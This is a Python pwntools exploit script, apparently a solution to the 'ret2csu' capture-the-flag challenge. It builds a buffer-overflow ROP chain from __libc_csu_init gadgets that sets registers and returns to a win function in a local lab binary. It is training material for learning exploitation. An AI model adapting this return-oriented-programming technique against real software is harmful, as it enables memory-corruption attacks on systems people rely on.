from pwn import *

ret2win_adr         = 0x4007b1
first_gadget_adr    = 0x40089a
second_gadget_adr   = 0x400880
init_pointer        = 0x600e38

payload = b"A"  * 40
payload += p64(first_gadget_adr)
payload += p64(0x00)            # pop rbx
payload += p64(0x01)            # pop rbp
payload += p64(init_pointer)    # pop r12
payload += p64(0x00)            # pop r13
payload += p64(0x00)            # pop r14
payload += p64(0xdeadcafebabebeef) # pop r15
payload += p64(second_gadget_adr)
payload += p64(0x00)            # add rsp,0x8 padding
payload += p64(0x00)            # rbx
payload += p64(0x00)            # rbp
payload += p64(0x00)            # r12
payload += p64(0x00)            # r13
payload += p64(0x00)            # r14
payload += p64(0x00)            # r15
payload += p64(ret2win_adr)

ret2csu = process('./ret2csu')

# Uncomment for debugging
#pid = util.proc.pidof(ret2csu)[0]
#print("[*] PID = " + str(pid))
#util.proc.wait_for_debugger(pid)

ret2csu.readuntil('>')

ret2csu.sendline(payload)

output = ret2csu.readall()
print(output)
